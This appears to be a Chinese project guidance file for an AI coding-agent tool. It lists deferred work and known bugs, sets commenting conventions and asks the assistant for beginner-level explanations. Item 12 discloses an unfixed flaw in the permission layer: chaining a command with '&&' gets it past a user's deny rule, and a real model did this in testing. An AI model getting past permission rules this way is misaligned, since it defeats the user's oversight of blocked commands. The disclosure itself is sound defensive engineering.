8. 上下文管理后续项（C8 spec 明确不做）：精确 tokenizer（当前仅「锚点+增量」近似估算）、摘要策略的机器学习/质量优化、存盘文件的清理与生命周期管理（`/clear` 只复位幂等状态、不删磁盘文件）、除窗口大小外其它阈值（存盘/保留/余量等）的可配置化、摘要内容的分段/多轮压缩与跨会话持久化。~~其中「保留区阈值」曾有一处实测局限~~ **已于 2026-07-29 修复**：`RETAIN_TOKENS` 与 `auto_margin` 原是固定常量、不随 `context_window` 缩放，导致小窗口（如 8192）上保留区比整个窗口还大、触发线为负——第二层摘要**永不真正压缩**且每轮空转。现改为「按窗口比例算再夹上限」（`summarize.retain_budget` / `manager._derive_margin`），**64K 及以上逐字维持原值**。护栏见 `tests/test_context_summarize.py::RetainScalesWithWindowTest`。
9. Skill 系统后续项（C11 spec 明确不做）：Skill 的市场分发与版本管理、嵌套激活（Skill 里再激活 Skill）、参数 schema 与校验、模板引擎（`$ARGUMENTS` 只做字面替换）、多个 Skill 并行执行、跨会话保持激活态、文件监听式自动热更新（当前需显式 `/skills reload`）。
10. Trace 记录器后续项（spec 明确不做）：TUI 驱动器（P1，用 Pilot 无人驱动界面跑完整场景，本轮只做 P0 记录器）、记录文件的自动清理与轮转（`--trace` 每次运行产一个新文件，攒多了要手工删）、实时流式查看（当前只能事后读文件）、可视化时间线、跨运行对比与差异分析、阈值（字段截断 4000 字符 / 消息条数 400）可配置化、采样与按类型开关（当前只有「全开」与「全关」两态）。
11. 记忆系统后续项（C9 spec 明确不做）：向量数据库/RAG 语义检索（召回只靠索引注入 + 按路径读文件）、团队记忆同步/跨机器共享、跨实例实时一致性（锁只保证「写不坏」，语义重复笔记靠 LLM 去重收敛）、笔记自动清理与遗忘机制、各阈值（24h 提醒/30 天过期/索引 200 行/锁 600 秒等）可配置化、存档格式版本迁移工具、存档加密或压缩存储。

12. **③可配置规则层对复合命令不拆段**（C12 验收期实测发现，2026-08-06 登记，**未修**）：
    `permission/rules.py` 的 command 分支直接调 `match_command(rule.pattern, request.specifier)`，
    对整串匹配、**不做 `split_commands`**。实测：

    ```
    deny: Bash(git push *)
      git push origin main                → deny  ✅
      git status && git push origin main  → 未命中 ❌
    ```

    ①危险命令黑名单**是拆的**（「复合命令逐段+整条双重检查」），③规则层不是。
    于是用户手写的 `deny` 命令规则会被一个 `&&` 绕过，而**这不需要刻意规避**——
    真实模型在一次普通请求里就自然产出了那种形态（C12 场景 9 首跑实测）。
    危害：用户以为自己拦住了某类命令，实际没有，且界面上完全看不出来。

    **C12 已在 Hook 侧补齐同一口径**（`hooks/conditions.py` 的 `_match_command_field`），
    但**没有动权限层**——那会改变 C6 的规则语义（更多命令会被 deny 命中），
    属于安全边界的行为变更，应当单独立项、单独评审。修的话要动
    `permission/rules.py` 的 `_rule_matches` 一处，并补「整条 + 逐段」的护栏与反证。

13. **Hook 系统后续项（C12 spec 明确不做）**：子 Agent 动作的真实运行（现为占位，等 SubAgent 章节对接）、`once` 标记的持久化、Hook 执行顺序的显式优先级、迭代级事件（Agent Loop 内单轮迭代不开放挂载点——那是引擎内部结构，暴露成配置契约会让循环结构的任何调整都成为破坏性变更）、配置中的字符串插值、HTTP 动作参与拦截决策、`/hooks reload` 热更新、本地级 `hooks.yaml`、Skill/MCP 形态的 Hook 动作、在 Skill frontmatter 里声明 Hook、Hook 修改工具参数或工具结果（Claude Code 的 `updatedInput` / `updatedToolOutput`）。

14. **子 Agent 系统后续项（C13 spec 明确不做）**：Worktree 文件隔离、多 Agent 团队编排
    （子 Agent 之间不通信、不互相委派）、后台任务的跨会话持久化、子 Agent 的人在回路、
    角色的持久记忆（Claude Code 的 `memory` 字段）、角色预加载 Skill（`skills` 字段）、
    插件级角色、角色定义热更新（`/agents reload`）、子 Agent 内嵌 Plan Mode、
    委派任务的优先级与调度（超并发上限即失败，不排队）。

    另有一项**实现期刻意保留的空实现**：`subagents/toolset.py` 的
    `BACKGROUND_DENIED_TOOLS` 恒为空集。Claude Code 里那一层的存在理由是
    「后台 agent 无法交互」，而本章全程非交互、前后台约束相同，因此它没有独立内容。
    保留结构位是为了将来真需要区分时有落点，**但不为它造人为差异**——
    那会让同一个角色在两种场景下行为不同而配置上看不出来。
    护栏 `test_subagent_toolset.py::BackgroundLayerTest` 钉住「前后台结果一致」。

15. **`SkillReloadOutcome.dropped_fatal` 是死代码**（对齐改造的残留，2026-07-29 登记，已确认**暂不处理**）：该字段现在恒为空元组——`skills/manager.py` 的 reload 硬编码传 `()`，因为「白名单含不存在的内置工具名就丢弃」这套语义已随收窄能力一起删除。连带 `conversation.py` 里 `if outcome.dropped_fatal:` 那个分支**永远进不去**。字段暂留只是为了不动 `trace/reader.py` 的 `skill_reload` 事件摘要契约。清理时要一起动的四处：`skills/models.py`（字段）+ `skills/manager.py`（传值）+ `conversation.py`（消费分支）+ `trace/reader.py`（摘要函数），并检查 `tests/test_trace_reader.py` 是否逐字断言了那段摘要。

16. **粘贴 `/skills` 报告会被命令解析器吞掉**（作者期扩展真实模型验收中观测到，2026-07-30 登记）：`skill-creator` 的「按建议修复」流程会让用户把 `/skills` 的建议段贴回对话里，而报告若以 `/skills` 开头，命令层会把整条消息当成 `/skills <子命令>` 处理并回「未知子命令」，消息**根本不进 AI**。命令系统的行为是对的（c10 的「未知命令不进 AI」是刻意设计），但这条工作流因此有真实摩擦。可选方向：让 `skill-creator` 改成引导用户「用 `/skills prompt` 或直接描述问题」而不是原样粘贴；或在命令层对「首行像命令但后续多行」的输入给一句更贴切的提示。**本次不改**——它牵动 c10 的解析契约，值得单独立项。

## 代码注释规范

为了降低项目理解成本，所有新增或修改的代码都必须包含充分、清晰、准确的中文注释。注释目标是：让第一次接触本项目的开发者，仅通过阅读代码和注释，就能理解代码的设计意图、执行流程、关键边界条件，并能够复现或安全修改相关逻辑。

### 基本要求

1. **注释语言**
   - 注释主体必须使用中文。
   - 技术关键词、框架名、协议名、变量名、函数名、类型名、设计模式名等可以保留英文，例如：`React`、`hook`、`middleware`、`cache`、`token`、`retry`、`Promise`、`DTO`、`Repository`。
   - 不要为了中文化而强行翻译通用技术词汇，避免造成理解歧义。

2. **注释粒度**
   - 关键模块、核心函数、复杂逻辑、边界处理、异常处理、数据转换、状态变更、异步流程、缓存策略、权限判断等必须写注释。
   - 简单自解释代码不需要机械式注释，例如 `count += 1` 不需要写“计数加一”。
   - 注释应解释“为什么这么做”和“这段代码承担什么职责”，而不是重复代码表面含义。

3. **可复现性要求**
   - 对于核心业务流程，注释需要说明输入来源、处理步骤、输出结果、关键依赖和副作用。
   - 第一次看项目的人应能根据注释理解该逻辑如何运行，并能在相同输入条件下复现代码行为。
   - 如果代码依赖特定配置、环境变量、外部服务、数据库结构或第三方 API，必须在注释中说明。

4. **函数/方法注释**
   - 复杂函数必须说明：
     - 函数用途
     - 参数含义
     - 返回值含义
     - 主要执行步骤
     - 可能抛出的异常或失败情况
     - 是否存在副作用，例如写数据库、发请求、修改全局状态、写缓存等

   示例：

   ```ts
   /**
    * 根据用户 ID 获取用户的完整资料。
    *
    * 执行流程：
    * 1. 先从 cache 中读取用户资料，减少数据库查询压力。
    * 2. 如果 cache 未命中，则查询 database。
    * 3. 查询成功后会将结果写回 cache，供后续请求复用。
    *
    * @param userId 用户唯一标识，必须是已登录用户的 ID。
    * @returns 用户完整资料；如果用户不存在，则返回 null。
    *
    * 副作用：
    * - cache 未命中时会访问 database。
    * - 查询成功后会写入 cache。
    */
   async function getUserProfile(userId: string): Promise<UserProfile | null> {
     // 优先读取 cache，避免高频请求直接打到 database
     const cachedProfile = await cache.get(userId)

     if (cachedProfile) {
       return cachedProfile
     }

     // cache 未命中时再查询 database，保证数据仍然可以被正确获取
     const profile = await userRepository.findById(userId)

     if (!profile) {
       return null
     }

     // 将查询结果写回 cache，提高后续相同用户请求的响应速度
     await cache.set(userId, profile)

     return profile
   }
   ```

## 文档搜索
在参考任何文档之前请确保文档是否是最新版本

## 学习与解释要求

我是第一次独立完成这类项目，可能对项目中的部分技术概念、架构设计、工具链、代码写法或最佳实践不熟悉。

在协助我开发时，请遵守以下要求：

1. **不要默认我已经理解相关技术背景**

   * 如果涉及新的技术概念、框架、库、设计模式或工程实践，请先用清楚、通俗的中文解释它是什么、为什么要用、解决了什么问题。

2. **解释代码修改的原因**

   * 不只是直接给出代码，还需要说明为什么要这样改。
   * 如果有多种实现方式，请简单说明当前方案的优点，以及为什么更适合这个项目。

3. **使用适合初学者理解的说明方式**

   * 解释时尽量避免只堆砌专业术语。
   * 必要时可以使用类比、步骤拆解或简单示例帮助理解。
   * 专业关键词可以保留英文，但需要配合中文解释。

4. **指出我需要重点理解的知识点**

   * 如果某段代码或某个设计背后涉及重要知识点，请明确指出。
   * 例如：异步处理、事件循环、状态管理、配置加载、异常处理、UI 渲染、Provider 抽象等。

5. **避免只给结论**

   * 对于关键修改，请说明：

     * 问题是什么
     * 为什么会出现这个问题
     * 应该如何解决
     * 修改后会带来什么效果

6. **保持教学式协作**

   * 这个项目不仅是为了完成代码，也是为了让我理解项目是如何搭建和演进的。
   * 因此，请在保证代码质量的同时，帮助我逐步建立对项目结构、技术选型和实现细节的理解。
